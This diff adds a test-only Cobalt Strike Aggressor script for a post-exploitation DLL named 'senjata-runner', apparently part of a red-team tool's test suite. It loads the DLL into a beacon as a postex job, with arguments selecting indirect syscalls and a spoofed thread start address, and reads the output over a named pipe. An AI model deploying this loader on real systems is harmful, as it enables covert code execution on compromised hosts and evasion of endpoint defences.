@@ -1,0 +1,48 @@
+# Test-only CNA for senjata-runner postex DLL Phase 3 smoke tests.
+# Loads the DLL and dispatches a no-arg postex job.
+
+beacon_command_register(
+    "test-runner",
+    "Phase 3 smoke test: dispatch senjata-runner with no args",
+    "Synopsis:\n  test-runner");
+
+alias test-runner {
+    local('$bid $dll_path $dll_data $handle $pipe_name $output_pipe $packed $callback');
+    $bid = $1;
+
+    $dll_path = script_resource("../../dist/senjata-runner.x64.dll");
+    if (!-isFile $dll_path) {
+        berror($bid, "[-] senjata-runner.x64.dll not found at " . $dll_path);
+        return;
+    }
+    $handle   = openf($dll_path);
+    $dll_data = readb($handle, -1);
+    closef($handle);
+
+    $pipe_name = get_postex_pipe();
+    if ($pipe_name is $null) {
+        berror($bid, "[-] get_postex_pipe() returned null; check post-ex.pipename in C2 profile");
+        return;
+    }
+    $output_pipe = "\\\\.\\pipe\\" . $pipe_name;
+
+    # UDPK packed args: empty args blob — just BeaconAPI table is enough.
+    # alloc_type=2 (VirtualAlloc), syscall=1 (indirect), thread_hint default.
+    $packed = bof_pack($bid, "iiizzb",
+        1, 2, 1, "ntdll.dll!RtlUserThreadStart+0x21",
+        $output_pipe, "");
+
+    $callback = lambda({
+        local('$bid $result %info $type');
+        this('$jid');
+        ($bid, $result, %info) = @_;
+        $type = %info["type"];
+        if ($type eq 'job_registered') { $jid = %info['jid']; }
+        else if ($type eq 'output') { bjoblog($bid, $jid, $result); }
+        else if ($type eq 'error')  { bjoberror($bid, $jid, $result); }
+    });
+
+    beacon_execute_postex_job($bid, "-1", $dll_data, $packed, $callback);
+    bread_pipe($bid, "ANONYMOUS_BYTESTREAM", "CALLBACK_POSTEX_KIT",
+               "test-runner", $output_pipe, 0, 60000, $null);
+}
